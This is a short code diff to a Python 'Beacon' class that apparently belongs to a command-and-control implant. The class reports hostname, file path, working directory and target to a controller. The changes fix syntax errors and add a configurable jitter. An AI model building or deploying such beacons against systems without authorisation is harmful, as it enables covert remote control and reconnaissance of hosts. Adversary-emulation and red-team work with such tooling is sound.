@@ -5,9 +5,7 @@ import os
 import socket
 import subprocess
 import stat
-import sys
 import time
-
 import requests
 
 
@@ -61,8 +59,7 @@ class Beacon:
             beacon = self._build_beacon(self.address, instructions['links'])
             self.send(beacon)
 
-    @staticmethod
-    def _build_beacon(target, links=[]):
+    def _build_beacon(self, target, links=[]):
         return dict(
             Name=socket.gethostname(),
             Location=__file__,
@@ -71,8 +68,8 @@ class Beacon:
             Range='android',
             Pwd=os.getcwd(),
             Target=target,
-            Links=links;
-            Sleep=15;
+            Links=links,
+            Sleep=self.jitter,
         )
 
     @staticmethod
